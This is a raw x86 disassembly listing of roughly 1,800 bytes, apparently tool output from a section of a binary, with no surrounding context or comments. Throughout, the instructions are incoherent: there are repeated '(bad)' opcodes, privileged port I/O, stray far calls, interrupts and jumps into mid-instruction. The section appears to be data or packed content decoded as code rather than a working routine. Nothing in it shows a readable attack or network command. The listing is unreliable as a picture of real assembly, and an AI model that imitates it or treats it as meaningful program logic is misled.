  41b073:	or     BYTE PTR [esi-0x20bbb1a4],dl
  41b079:	jmp    0xa15e11ad
  41b07e:	sahf   
  41b07f:	or     al,0x68
  41b081:	adc    DWORD PTR [esp+esi*8],0xffffffce
  41b085:	shl    DWORD PTR [edi-0x647aa27],0x90
  41b08c:	jns    0x41b035
  41b08e:	sbb    al,0x4e
  41b090:	mov    esp,0x39c50284
  41b095:	xor    BYTE PTR [esi],bh
  41b097:	js     0x41b10a
  41b099:	mov    edi,0x4ad658db
  41b09e:	inc    esp
  41b09f:	sub    BYTE PTR [ecx-0x4def4350],bl
  41b0a5:	sbb    eax,0xb2812fd7
  41b0aa:	dec    esp
  41b0ab:	test   al,0x8e
  41b0ad:	push   ss
  41b0ae:	pusha  
  41b0af:	(bad)  
  41b0b0:	or     al,0x83
  41b0b2:	sub    al,0xaf
  41b0b4:	or     al,0xa0
  41b0b6:	jno    0x41b058
  41b0b8:	pusha  
  41b0b9:	cmp    al,0x0
  41b0bb:	pop    ebx
  41b0bc:	mov    ah,bh
  41b0be:	jnp    0x41b13f
  41b0c0:	and    DWORD PTR ds:0x851dc2fb,edx
  41b0c6:	out    0x96,eax
  41b0c8:	pop    ds
  41b0c9:	mov    esi,0x7ef82a82
  41b0ce:	xor    BYTE PTR [ebx+edi*8],0x1e
  41b0d2:	pop    ebx
  41b0d3:	xor    DWORD PTR ds:0x9b42e98,0x6c
  41b0da:	rol    BYTE PTR [edx+0x3158ca59],0x6c
  41b0e1:	push   esi
  41b0e2:	dec    ebp
  41b0e3:	jmp    0x41b12a
  41b0e5:	xor    DWORD PTR [edi],edi
  41b0e7:	not    BYTE PTR [eax-0x229127d3]
  41b0ed:	pop    es
  41b0ee:	call   0x6425:0xf99480bd
  41b0f5:	jnp    0x41b135
  41b0f7:	adc    bl,BYTE PTR [esi-0x11]
  41b0fa:	outs   dx,BYTE PTR ds:[esi]
  41b0fb:	(bad)  
  41b0fc:	(bad)  
  41b0fd:	ins    DWORD PTR es:[edi],dx
  41b0fe:	cmp    edi,edi
  41b100:	mov    ecx,0x6f62c417
  41b105:	or     DWORD PTR [edi-0x3],ebx
  41b108:	bound  ecx,QWORD PTR [ecx-0xcd35df0]
  41b10e:	or     DWORD PTR [edi],ebx
  41b110:	lods   eax,DWORD PTR ds:[esi]
  41b111:	int    0x6d
  41b113:	ins    BYTE PTR es:[edi],dx
  41b114:	push   ds
  41b115:	(bad)  
  41b116:	int    0xc1
  41b118:	mov    al,ds:0x9c419dd4
  41b11d:	xchg   DWORD PTR [esi+ebp*8+0x510ffee2],edi
  41b124:	jmp    0xdaa72a04
  41b129:	sub    al,0xf4
  41b12b:	mov    ebp,0x5dd0426d
  41b130:	inc    ebp
  41b131:	add    DWORD PTR [ebx],ecx
  41b133:	ds xchg edi,eax
  41b135:	fcmovnbe st,st(3)
  41b137:	test   BYTE PTR [eax-0x69],bh
  41b13a:	dec    ebx
  41b13b:	lahf   
  41b13c:	push   edi
  41b13d:	rcr    BYTE PTR [ebx+0x9492229],cl
  41b143:	scas   al,BYTE PTR es:[edi]
  41b144:	push   edi
  41b145:	retf   
  41b146:	mov    ah,0xf0
  41b148:	loope  0x41b148
  41b14a:	call   0x30bb9fb7
  41b14f:	dec    esp
  41b150:	sbb    BYTE PTR [ebx-0x11],cl
  41b153:	mov    esp,0x317e716c
  41b158:	jp     0x41b121
  41b15a:	pop    eax
  41b15b:	(bad)  
  41b15d:	aad    0x8f
  41b15f:	mov    eax,0x8693bab1
  41b164:	div    BYTE PTR [ecx+0x6685d81d]
  41b16a:	(bad)  
  41b16b:	pop    eax
  41b16c:	sahf   
  41b16d:	push   ds
  41b16e:	arpl   sp,dx
  41b170:	adc    eax,0x1a58efd5
  41b176:	mov    ds:0x1f255549,al
  41b17b:	push   esp
  41b17c:	xor    ecx,esp
  41b17e:	or     al,0x76
  41b180:	xchg   esp,eax
  41b181:	mov    ah,0x9b
  41b183:	sub    DWORD PTR [ebp-0x4a],0xffffffaa
  41b187:	in     eax,dx
  41b188:	cmp    eax,0x39ee4680
  41b18d:	adc    ah,dl
  41b18f:	and    BYTE PTR [edx-0x20],ah
  41b192:	fwait
  41b193:	or     eax,0x721a9d77
  41b198:	(bad)  
  41b19a:	sar    DWORD PTR [ecx+eax*1-0x24c6e73b],cl
  41b1a1:	(bad)  
  41b1a2:	pushf  
  41b1a3:	fld    DWORD PTR [edi]
  41b1a5:	ficomp WORD PTR [edx-0x58]
  41b1a8:	rcr    BYTE PTR [edx],0xb6
  41b1ab:	xchg   ebx,eax
  41b1ac:	xchg   BYTE PTR [eax+0x66],dl
  41b1af:	pop    ebp
  41b1b0:	jns    0x41b185
  41b1b2:	xor    dl,BYTE PTR [ebp+0x52]
  41b1b5:	mov    es,WORD PTR [ecx]
  41b1b7:	clc    
  41b1b8:	(bad)  
  41b1b9:	loope  0x41b1af
  41b1bb:	jnp    0x41b1ed
  41b1bd:	and    bh,BYTE PTR [esp+eax*4-0x2114ce5b]
  41b1c4:	xchg   BYTE PTR [eax+0x1],bl
  41b1c7:	and    BYTE PTR [esp+eiz*2],al
  41b1ca:	stc    
  41b1cb:	popa   
  41b1cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b1cd:	test   edi,0x30995a71
  41b1d3:	sbb    edx,DWORD PTR [edx+0x61]
  41b1d6:	ret    0x6401
  41b1d9:	inc    ebp
  41b1da:	xchg   DWORD PTR [ecx],ecx
  41b1dc:	adc    DWORD PTR [eax],edx
  41b1de:	popf   
  41b1df:	imul   edx,DWORD PTR [ebp-0x5fa4b767],0x327ddef2
  41b1e9:	mov    cl,0xeb
  41b1eb:	scas   al,BYTE PTR es:[edi]
  41b1ec:	sbb    al,0x38
  41b1ee:	neg    DWORD PTR [edi+eax*1+0x5eff29b0]
  41b1f5:	scas   eax,DWORD PTR es:[edi]
  41b1f6:	pushf  
  41b1f7:	adc    DWORD PTR [ecx+0x3d6659ff],edi
  41b1fd:	leave  
  41b1fe:	leave  
  41b1ff:	es adc esp,ecx
  41b202:	push   ebp
  41b203:	jb     0x41b25b
  41b205:	inc    edx
  41b206:	out    0xe0,eax
  41b208:	push   edx
  41b209:	push   esi
  41b20a:	push   esp
  41b20b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b20c:	aam    0x7c
  41b20e:	lods   eax,DWORD PTR ds:[esi]
  41b20f:	or     DWORD PTR [edx-0x74],edi
  41b212:	(bad)  
  41b213:	mov    edi,0x98a763f5
  41b218:	shl    BYTE PTR ds:0x79084ea6,1
  41b21e:	and    DWORD PTR [ecx+0x689aa023],ebp
  41b224:	call   ecx
  41b226:	dec    eax
  41b227:	push   es
  41b228:	into   
  41b229:	xchg   esi,eax
  41b22a:	dec    edx
  41b22b:	or     DWORD PTR ss:[edx+0x6d],esp
  41b22f:	add    al,0x5f
  41b231:	cmp    al,BYTE PTR [esi]
  41b233:	xor    DWORD PTR [edx],0xffffff8f
  41b236:	imul   ebp,ebp,0x6a
  41b239:	je     0x41b25d
  41b23b:	int3   
  41b23c:	call   0x4ad8:0x9860497f
  41b243:	iret   
  41b244:	push   eax
  41b245:	xchg   ecx,eax
  41b246:	sbb    eax,0xae542730
  41b24b:	add    DWORD PTR [ecx],esi
  41b24d:	pop    ecx
  41b24e:	lahf   
  41b24f:	xor    ecx,DWORD PTR [edx-0x71]
  41b252:	xor    edx,DWORD PTR [esi+0x355dc16f]
  41b258:	mov    edi,0xe3117ff
  41b25d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b25e:	mov    esp,0xfeff29a0
  41b263:	sub    eax,0xf832b71c
  41b268:	(bad)  
  41b269:	fisubr DWORD PTR ds:0x56dbe82b
  41b26f:	inc    ebx
  41b270:	jns    0x41b229
  41b272:	ret    
  41b273:	sbb    ebx,DWORD PTR [edx-0x13cacc29]
  41b279:	fsubr  DWORD PTR [eax]
  41b27b:	retw   
  41b27d:	push   edi
  41b27e:	push   esi
  41b27f:	xchg   ebp,eax
  41b280:	mov    esi,0xfb0fe2ed
  41b285:	xlat   BYTE PTR ds:[ebx]
  41b286:	push   esi
  41b287:	stos   DWORD PTR es:[edi],eax
  41b288:	scas   eax,DWORD PTR es:[edi]
  41b289:	sub    edi,eax
  41b28b:	jns    0x41b262
  41b28d:	pop    esp
  41b28e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b28f:	scas   eax,DWORD PTR es:[edi]
  41b290:	int3   
  41b291:	xchg   ebx,ebx
  41b293:	mov    ds:0x7227e46c,eax
  41b298:	pusha  
  41b299:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b29a:	dec    edx
  41b29b:	push   cs
  41b29c:	xor    BYTE PTR [edi],0xbb
  41b29f:	fcomp  st(3)
  41b2a1:	(bad)  
  41b2a2:	xor    esp,DWORD PTR [eax]
  41b2a4:	outs   dx,DWORD PTR ds:[esi]
  41b2a5:	dec    esp
  41b2a6:	data16 add al,0xcc
  41b2a9:	ins    BYTE PTR es:[edi],dx
  41b2aa:	push   bp
  41b2ac:	push   eax
  41b2ad:	ja     0x41b27b
  41b2af:	in     eax,0xf9
  41b2b1:	sub    al,0xaf
  41b2b3:	repz and edx,DWORD PTR [ebp-0x38151902]
  41b2ba:	xchg   DWORD PTR ds:0x46ddab7f,ebx
  41b2c0:	imul   dh
  41b2c2:	add    dh,dh
  41b2c4:	pop    ss
  41b2c5:	test   BYTE PTR [edx-0xa],bl
  41b2c8:	daa    
  41b2c9:	adc    eax,0x2d4b44ef
  41b2ce:	shl    DWORD PTR [eax-0x560c7def],1
  41b2d4:	mov    ebx,0x1ade237
  41b2d9:	data16 gs adc al,0xcd
  41b2dd:	dec    esi
  41b2de:	call   DWORD PTR [esi+0x342fb0cf]
  41b2e4:	xchg   BYTE PTR [edx-0x48],bh
  41b2e7:	fstp   QWORD PTR [ebp+0x67a1b3f]
  41b2ed:	mov    al,ds:0x60a2d02e
  41b2f2:	sbb    BYTE PTR [ecx],ch
  41b2f4:	fucomi st,st(4)
  41b2f6:	in     al,dx
  41b2f7:	mov    ecx,0xa5df0ab7
  41b2fc:	outs   dx,DWORD PTR ds:[esi]
  41b2fd:	int    0x4c
  41b2ff:	ja     0x41b288
  41b301:	and    edx,edx
  41b303:	adc    DWORD PTR [edx],0xffffffbe
  41b306:	and    DWORD PTR [ecx+0x36],edi
  41b309:	cld    
  41b30a:	mov    edx,0x7d52af0c
  41b30f:	aam    0x8b
  41b311:	retf   0x3a2b
  41b314:	adc    eax,edx
  41b316:	ins    BYTE PTR es:[edi],dx
  41b317:	mov    bl,0xf
  41b319:	mov    ds:0x23c02d0c,al
  41b31e:	and    DWORD PTR ds:0xf80fa8ce,eax
  41b324:	loop   0x41b2b9
  41b326:	mov    edx,0xb5c000d7
  41b32b:	and    esp,DWORD PTR [edi+0x38]
  41b32e:	mov    ah,0x29
  41b330:	adc    BYTE PTR [eax-0x25],cl
  41b333:	dec    ecx
  41b334:	(bad)
  41b337:	mov    cl,0x82
  41b339:	imul   edx,DWORD PTR [ecx+0x3],0x4c
  41b33d:	outs   dx,DWORD PTR ds:[esi]
  41b33e:	frstor ds:0x65d9fd25
  41b344:	mov    ebp,0xb8c3c26f
  41b349:	pop    ds
  41b34a:	fsubp  st(1),st
  41b34c:	inc    ecx
  41b34d:	jne    0x41b30c
  41b34f:	ficomp WORD PTR [esi]
  41b351:	aaa    
  41b352:	in     eax,0x8a
  41b354:	gs jge 0x41b2f2
  41b357:	jbe    0x41b3af
  41b359:	adc    eax,0x3b660d2b
  41b35e:	push   edx
  41b35f:	enter  0x20d2,0x62
  41b363:	pusha  
  41b364:	sbb    BYTE PTR [esi+0x4c],al
  41b367:	sbb    al,0x5f
  41b369:	mov    ah,0x6c
  41b36b:	or     edi,ebp
  41b36d:	pop    ebx
  41b36e:	sub    ch,BYTE PTR [edi]
  41b370:	lea    ecx,[ebx+0x55]
  41b373:	sbb    ch,bl
  41b375:	pop    edi
  41b376:	jle    0x41b3c0
  41b378:	fidiv  DWORD PTR [edi+edi*8+0x3124dbb9]
  41b37f:	fsubr  QWORD PTR [eax-0x7f]
  41b382:	sub    BYTE PTR [ecx-0x4a91b36d],ch
  41b388:	pop    ds
  41b389:	std    
  41b38a:	and    DWORD PTR [ecx],0xbec81a0b
  41b390:	xor    ecx,DWORD PTR [ebx]
  41b392:	enter  0x9912,0xe5
  41b396:	fcmovnu st,st(5)
  41b398:	sbb    DWORD PTR [ecx+0x4492d485],eax
  41b39e:	mov    ebx,0x5791cf6d
  41b3a3:	xchg   ebp,eax
  41b3a4:	xor    BYTE PTR [ebx*2+0x4e49f604],al
  41b3ab:	or     BYTE PTR [ecx-0x152f9c9],0x54
  41b3b2:	dec    ebp
  41b3b3:	repnz lods eax,DWORD PTR ds:[esi]
  41b3b5:	aam    0xfc
  41b3b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b3b8:	jmp    0x41b37b
  41b3ba:	mov    edi,0x2da0a3c8
  41b3bf:	outs   dx,BYTE PTR ds:[esi]
  41b3c0:	push   cs
  41b3c1:	out    dx,al
  41b3c2:	dec    ebx
  41b3c3:	jp     0x41b383
  41b3c5:	pop    di
  41b3c7:	mov    ds:0xfe61149d,al
  41b3cd:	lahf   
  41b3ce:	and    DWORD PTR ss:[ecx+0x3be89546],esi
  41b3d5:	inc    esi
  41b3d6:	jnp    0x41b388
  41b3d8:	ret    
  41b3d9:	dec    edi
  41b3da:	sar    BYTE PTR [ecx],cl
  41b3dc:	xchg   edx,eax
  41b3dd:	pop    es
  41b3de:	xchg   edi,eax
  41b3df:	or     DWORD PTR ds:0xed272f02,esp
  41b3e5:	mov    ebp,0x27562535
  41b3ea:	mov    WORD PTR [eax+0x7b],?
  41b3ed:	addr16 fmulp st(4),st
  41b3f0:	inc    esp
  41b3f1:	and    al,0x8f
  41b3f3:	(bad)  
  41b3f4:	mov    ds:0xa63949bf,eax
  41b3f9:	sbb    eax,ebp
  41b3fb:	lds    ebp,FWORD PTR [edx-0x1cb9c52]
  41b401:	retf   
  41b402:	lods   eax,DWORD PTR ds:[esi]
  41b403:	punpcklwd mm3,DWORD PTR [ebp+0x4a58e7a5]
  41b40a:	icebp  
  41b40b:	dec    edi
  41b40c:	popf   
  41b40d:	fcomp  QWORD PTR [ebx]
  41b40f:	mov    eax,0x43268b99
  41b414:	adc    DWORD PTR [esp+ecx*2],esi
  41b417:	jo     0x41b422
  41b419:	mov    edx,0xe226bba8
  41b41e:	mov    ebx,0x7dca1655
  41b423:	dec    ebx
  41b424:	sub    al,0x30
  41b426:	add    eax,0xa9abffa2
  41b42b:	add    al,BYTE PTR [eax+0x699559f]
  41b431:	popf   
  41b432:	jne    0x41b493
  41b434:	mov    ?,WORD PTR [ebp+0x551ea883]
  41b43a:	lods   eax,DWORD PTR ds:[esi]
  41b43b:	sbb    DWORD PTR [ebp-0x16],ebp
  41b43e:	xor    DWORD PTR [edx-0x53],esi
  41b441:	add    eax,0x829dff95
  41b446:	dec    ebp
  41b447:	jne    0x41b40f
  41b449:	ret    0xb6ac
  41b44c:	xchg   esp,eax
  41b44d:	mov    ebp,0x9db267ee
  41b452:	cli    
  41b453:	mov    al,ds:0xdb829b00
  41b458:	mov    eax,0x4ba83987
  41b45d:	adc    edi,DWORD PTR [ecx+eiz*2+0x211e1c17]
  41b464:	jecxz  0x41b4a4
  41b466:	aaa    
  41b467:	dec    eax
  41b468:	fbstp  TBYTE PTR [edi]
  41b46a:	adc    al,BYTE PTR [esi]
  41b46c:	js     0x41b4e3
  41b46e:	adc    ah,ah
  41b470:	dec    edi
  41b471:	out    dx,eax
  41b472:	shl    DWORD PTR [edx+0x15422bbd],1
  41b478:	jo     0x41b4f2
  41b47a:	inc    ebp
  41b47b:	rcl    dh,cl
  41b47d:	aaa    
  41b47e:	mov    ebx,0x99c66131
  41b483:	das    
  41b484:	(bad)  
  41b485:	stc    
  41b486:	jbe    0x41b480
  41b488:	retf   0xade6
  41b48b:	mov    ebx,0x8683a927
  41b490:	stos   BYTE PTR es:[edi],al
  41b491:	sbb    BYTE PTR [ecx-0x51],bl
  41b494:	test   eax,0x48cf3a5c
  41b499:	add    dl,BYTE PTR [ebx+0x3]
  41b49c:	imul   edi,DWORD PTR es:0xd5ea0083,0x828e691e
  41b4a7:	stos   BYTE PTR es:[edi],al
  41b4a8:	lods   al,BYTE PTR ds:[esi]
  41b4a9:	outs   dx,DWORD PTR ds:[esi]
  41b4aa:	mov    BYTE PTR [edx],al
  41b4ac:	pop    ecx
  41b4ad:	stos   BYTE PTR es:[edi],al
  41b4ae:	jns    0x41b43d
  41b4b0:	std    
  41b4b1:	xor    DWORD PTR [ecx+0x1e],esi
  41b4b4:	pusha  
  41b4b5:	pusha  
  41b4b6:	test   eax,0x823b62a4
  41b4bb:	push   edx
  41b4bc:	(bad)  
  41b4bd:	stos   DWORD PTR es:[edi],eax
  41b4be:	shr    DWORD PTR [ebp-0x37e302ac],1
  41b4c4:	enter  0x7c89,0x4c
  41b4c8:	cmp    al,0x84
  41b4ca:	cmp    al,0x27
  41b4cc:	or     dh,BYTE PTR [ebx-0x1a]
  41b4cf:	mov    al,0x80
  41b4d1:	cmp    cl,bl
  41b4d3:	(bad)  
  41b4d4:	sbb    al,0xa8
  41b4d6:	stc    
  41b4d7:	and    BYTE PTR [edi+0x7a],dl
  41b4da:	dec    edi
  41b4db:	mov    al,0x39
  41b4dd:	xor    al,BYTE PTR [edi-0x2e1d01f1]
  41b4e3:	adc    DWORD PTR [eax-0x7e],ebp
  41b4e6:	aad    0xb8
  41b4e8:	stos   BYTE PTR es:[edi],al
  41b4e9:	(bad)  
  41b4ea:	stc    
  41b4eb:	cmp    edi,edx
  41b4ed:	rcl    DWORD PTR [ecx],cl
  41b4ef:	mov    bh,0x13
  41b4f1:	lds    eax,FWORD PTR ds:0xbac4a6ef
  41b4f7:	in     al,0x54
  41b4f9:	jbe    0x41b55f
  41b4fb:	adc    al,0xfd
  41b4fd:	sub    eax,0xaf0db033
  41b502:	and    esi,DWORD PTR [ebx]
  41b504:	outs   dx,BYTE PTR cs:[esi]
  41b506:	jns    0x41b534
  41b508:	adc    BYTE PTR [ebx],0x4
  41b50b:	jge    0x41b4da
  41b50d:	cwde   
  41b50e:	dec    ebx
  41b50f:	or     DWORD PTR [edi+0x6f7b592b],edx
  41b515:	bnd jmp 0x41b4d4
  41b518:	das    
  41b519:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b51a:	xchg   edx,eax
  41b51b:	xchg   edx,eax
  41b51c:	cmp    DWORD PTR [esi],edx
  41b51e:	push   eax
  41b51f:	mov    ecx,DWORD PTR [edx-0x4d]
  41b522:	jo     0x41b511
  41b524:	sbb    al,0xf8
  41b526:	mov    ecx,0x3bc712aa
  41b52b:	dec    eax
  41b52c:	mov    DWORD PTR [ecx+0x7d],edx
  41b52f:	dec    ecx
  41b530:	mov    esp,0x35b02a09
  41b535:	mov    ecx,0x16de3108
  41b53a:	push   esp
  41b53b:	mov    esi,0x1aeffb9a
  41b540:	pushf  
  41b541:	stos   DWORD PTR es:[edi],eax
  41b542:	jnp    0x41b4f3
  41b544:	rcl    BYTE PTR [ebx],0xb9
  41b547:	sahf   
  41b548:	mov    edi,0x523f72b2
  41b54d:	out    dx,al
  41b54e:	push   eax
  41b54f:	int    0x2f
  41b551:	jne    0x41b515
  41b553:	in     al,0xb0
  41b555:	or     eax,0x48bd2cfb
  41b55a:	xor    esi,DWORD PTR [ecx]
  41b55c:	out    0xa4,eax
  41b55e:	std    
  41b55f:	jbe    0x41b55a
  41b561:	ficom  DWORD PTR [ebp+esi*2-0x46]
  41b565:	cmp    al,0x99
  41b567:	out    0xbc,eax
  41b569:	sub    DWORD PTR [ebp-0x7e],ecx
  41b56c:	lods   eax,DWORD PTR cs:[esi]
  41b56e:	inc    edi
  41b56f:	jns    0x41b573
  41b571:	fucom  st(3)
  41b573:	sbb    DWORD PTR [esi+0x77],ecx
  41b576:	sub    cl,BYTE PTR [ebx-0x24]
  41b579:	iret   
  41b57a:	js     0x41b555
  41b57c:	jae    0x41b500
  41b57e:	and    bl,0xd3
  41b581:	add    eax,DWORD PTR [ecx+0x2f]
  41b584:	adc    BYTE PTR [eax+ecx*4-0x3ba5a66d],0x7b
  41b58c:	mov    esp,0x11ffe3f4
  41b591:	test   BYTE PTR [esi+0x3e03f4ac],dl
  41b597:	or     edi,DWORD PTR [ebp+ebp*2-0x71]
  41b59b:	dec    edx
  41b59c:	out    dx,eax
  41b59d:	sub    BYTE PTR [eax+0xc8a09a8],bh
  41b5a3:	push   edi
  41b5a4:	bound  edi,QWORD PTR [edx-0x7440acf0]
  41b5aa:	add    BYTE PTR [ebp-0x221b0845],0xf3
  41b5b1:	pop    esi
  41b5b2:	jmp    0x41b5f2
  41b5b4:	in     eax,dx
  41b5b5:	cs inc ecx
  41b5b7:	mov    al,ds:0xbce9075d
  41b5bc:	sbb    DWORD PTR [ecx-0x6763fb2e],esi
  41b5c2:	push   ds
  41b5c3:	out    dx,eax
  41b5c4:	cmovg  ebp,DWORD PTR [ebp+ebx*4-0x7c]
  41b5c9:	mov    dh,0x83
  41b5cb:	add    ecx,0x653cb077
  41b5d1:	adc    eax,0x46ef2db1
  41b5d6:	cdq    
  41b5d7:	pop    ds
  41b5d8:	(bad)  
  41b5d9:	(bad)  
  41b5da:	pop    ebx
  41b5db:	ds in  al,0x6e
  41b5de:	nop
  41b5df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5e0:	ret    0x2925
  41b5e3:	add    bl,al
  41b5e5:	or     bh,0x6d
  41b5e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5e9:	scas   al,BYTE PTR es:[edi]
  41b5ea:	mov    WORD PTR [esi+ebx*8+0x2c],ds
  41b5ee:	mov    ds:0xd3054304,eax
  41b5f3:	inc    edi
  41b5f4:	fld    DWORD PTR [bp+si]
  41b5f7:	push   ss
  41b5f8:	adc    ch,al
  41b5fa:	sub    ebx,DWORD PTR [eax-0x6ea69b83]
  41b600:	xchg   esi,eax
  41b601:	sbb    eax,0xd42e8a00
  41b607:	cmp    BYTE PTR [esi-0x1e85d572],bh
  41b60d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b60e:	sbb    ch,BYTE PTR [edi-0x3f4c9d72]
  41b614:	push   ebx
  41b615:	xchg   ecx,eax
  41b616:	inc    esp
  41b617:	into   
  41b618:	mov    al,ds:0xbb1deb8d
  41b61d:	mov    dl,0x7a
  41b61f:	aas    
  41b620:	rcr    BYTE PTR [edx-0x6b1db867],cl
  41b626:	ds mov cl,0x65
  41b629:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41b62b:	dec    edx
  41b62c:	sbb    eax,0xccd056db
  41b631:	popa   
  41b632:	rcl    DWORD PTR [ebp+0x1c],cl
  41b635:	lods   eax,DWORD PTR ds:[esi]
  41b636:	dec    esp
  41b637:	adc    esi,DWORD PTR [esi-0x3b23fa2a]
  41b63d:	add    eax,0xc5d2a3b5
  41b642:	mov    ah,0x81
  41b644:	lock jecxz 0x41b679
  41b647:	loope  0x41b627
  41b649:	jl     0x41b621
  41b64b:	retf   
  41b64c:	add    BYTE PTR [ebp+0x2a323fc8],dl
  41b652:	adc    BYTE PTR [edx],dh
  41b654:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b655:	xor    dl,bh
  41b657:	cmp    dh,BYTE PTR [esp+edx*2-0x70]
  41b65b:	in     eax,dx
  41b65c:	or     ah,bl
  41b65e:	sub    DWORD PTR [esi],ebp
  41b660:	int3   
  41b661:	scas   eax,DWORD PTR es:[edi]
  41b662:	repnz sbb al,0x13
  41b665:	xlat   BYTE PTR ds:[ebx]
  41b666:	adc    al,0x13
  41b668:	and    DWORD PTR [ecx-0x6c73f25a],edi
  41b66e:	es (bad) 
  41b670:	rcl    BYTE PTR [ebx+0x6549ae05],cl
  41b676:	push   ss
  41b677:	aam    0x32
  41b679:	std    
  41b67a:	std    
  41b67b:	pop    edx
  41b67c:	call   0x543:0x9a78e520
  41b683:	cs das 
  41b685:	aad    0x17
  41b687:	leave  
  41b688:	(bad)  
  41b68a:	pop    edi
  41b68b:	mov    WORD PTR [edi-0x9],fs
  41b68e:	clc    
  41b68f:	jg     0x41b668
  41b691:	cwde   
  41b692:	mov    al,ds:0x2b4cedee
  41b697:	xchg   edi,eax
  41b698:	int3   
  41b699:	pop    ds
  41b69a:	stc    
  41b69b:	dec    edx
  41b69c:	in     eax,0xc3
  41b69e:	mov    BYTE PTR [ecx-0x303bf00e],bl
  41b6a4:	mov    eax,0xbec28782
  41b6a9:	ins    DWORD PTR es:[edi],dx
  41b6aa:	bound  edi,QWORD PTR ds:0x4d7bdddd
  41b6b0:	cmc    
  41b6b1:	and    DWORD PTR [eax],0xe764c0aa
  41b6b7:	je     0x41b693
  41b6b9:	outs   dx,BYTE PTR ds:[esi]
  41b6ba:	das    
  41b6bb:	or     ebx,DWORD PTR [edi+0xfa6b5fc]
  41b6c1:	mov    bh,BYTE PTR [edi]
  41b6c3:	cdq    
  41b6c4:	mov    fs,WORD PTR [ebx+0x1e]
  41b6c7:	fmul   QWORD PTR [ecx+0x44]
  41b6ca:	sbb    DWORD PTR [edx-0x7a],eax
  41b6cd:	mov    eax,0x24655c09
  41b6d2:	hlt    
  41b6d3:	xlat   BYTE PTR ds:[ebx]
  41b6d4:	xchg   esp,eax
  41b6d5:	xchg   edi,eax
  41b6d6:	pop    eax
  41b6d7:	lds    ebx,FWORD PTR [edi+0x34169bce]
  41b6dd:	test   al,0x1f
  41b6df:	popa   
  41b6e0:	pop    eax
  41b6e1:	enter  0xb1cc,0x39
  41b6e5:	jne    0x41b6a4
  41b6e7:	int    0xe4
  41b6e9:	or     eax,0xf29afae8
  41b6ee:	jb     0x41b740
  41b6f0:	pop    edx
  41b6f1:	or     DWORD PTR [ecx],0x9d63520e
  41b6f7:	stc    
  41b6f8:	popf   
  41b6f9:	js     0x41b67d
  41b6fb:	shl    BYTE PTR [eax],cl
  41b6fd:	add    BYTE PTR [eax+0x1],cl
  41b700:	or     esp,ebx
  41b702:	mov    ecx,0x90a5b5fc
  41b707:	mov    edx,0x807481ae
  41b70c:	jo     0x41b787
  41b70e:	or     al,0x82
  41b710:	cmp    DWORD PTR [edx],esp
  41b712:	jle    0x41b71f
  41b714:	daa    
  41b715:	cmc    
  41b716:	jg     0x41b6b4
  41b718:	or     esi,eax
  41b71a:	outs   dx,DWORD PTR ds:[esi]
  41b71b:	fdiv   st,st(0)
  41b71d:	adc    dh,bl
  41b71f:	dec    edi
  41b720:	cmp    DWORD PTR [ecx-0x51],0x8a96bb5b
  41b727:	shl    DWORD PTR [ebp+0x78],0x9
  41b72b:	pushf  
  41b72c:	and    eax,0x283e8f0b
  41b731:	scas   al,BYTE PTR es:[edi]
  41b732:	cmp    al,0x45
  41b734:	les    eax,FWORD PTR [ebx-0x7213c293]
  41b73a:	jecxz  0x41b6c8
  41b73c:	inc    eax
  41b73d:	sbb    ecx,0xffffffc7
  41b740:	aam    0x9f
  41b742:	cmp    ebx,DWORD PTR ds:0x460bc87
  41b748:	pop    eax
  41b749:	stos   DWORD PTR es:[edi],eax
  41b74a:	dec    ebp
  41b74b:	push   ss
  41b74c:	inc    ebx
  41b74d:	test   eax,0x40717998
  41b752:	bound  edi,QWORD PTR [esi]
  41b754:	xor    eax,0xa1f4087
  41b759:	dec    ebx
  41b75a:	or     eax,0xeb02c4fd
  41b75f:	or     ah,BYTE PTR [esi-0x4fd0ca9b]
  41b765:	aaa    
  41b766:	ins    BYTE PTR es:[edi],dx
  41b767:	add    esp,DWORD PTR [ebx]
  41b769:	add    ch,BYTE PTR [edi]
  41b76b:	mov    edx,0x688da801
  41b770:	cmp    al,0x75
  41b772:	out    dx,al
  41b773:	xor    al,0x4f
  41b775:	mov    dl,0x81
  41b777:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b778:	cmp    BYTE PTR [ecx+0x41e90f46],dl
  41b77e:	mov    DWORD PTR [edx],esi
  41b780:	mov    ds:0x9b2a3a75,al
  41b785:	mov    al,0xf2
  41b787:	lods   al,BYTE PTR ds:[esi]
  41b788:	jae    0x41b7b8
  41b78a:	shl    DWORD PTR [ebx-0x3c],1
  41b78d:	xchg   ebp,eax
  41b78e:	push   edi
  41b78f:	mov    al,ds:0x8b4f8f8a
  41b794:	repz in eax,0xff
  41b797:	and    eax,0x3fc91347
  41b79c:	push   ebx
  41b79d:	nop
  41b79e:	in     eax,dx
  41b79f:	adc    esp,0x69
  41b7a2:	push   cs
  41b7a3:	inc    edi
  41b7a4:	add    eax,0xddc40e24
  41b7a9:	jmp    0x41b819
  41b7ab:	cmc    
  41b7ac:	(bad)  
  41b7ad:	push   edi
  41b7ae:	inc    ebp
  41b7af:	xchg   edx,eax
  41b7b0:	xlat   BYTE PTR ds:[ebx]
  41b7b1:	adc    bl,BYTE PTR [eax-0x9]
  41b7b4:	mov    ss,WORD PTR ds:0xb8a6b4
  41b7ba:	dec    ecx
  41b7bb:	aaa    
  41b7bc:	push   edi
  41b7bd:	jle    0x41b78f
  41b7bf:	icebp  
  41b7c0:	arpl   WORD PTR ds:0x472f684f,cx
  41b7c6:	fnstenv [ebx-0xe]
  41b7c9:	jg     0x41b848
  41b7cb:	in     eax,0xb7
  41b7cd:	mov    ch,0xea
  41b7cf:	nop
  41b7d0:	loopne 0x41b7a7
  41b7d2:	push   edi
  41b7d3:	xchg   ah,ah
  41b7d5:	xchg   edi,eax
  41b7d6:	xchg   ebx,eax
  41b7d7:	shr    DWORD PTR [eax+0xb],0xd7
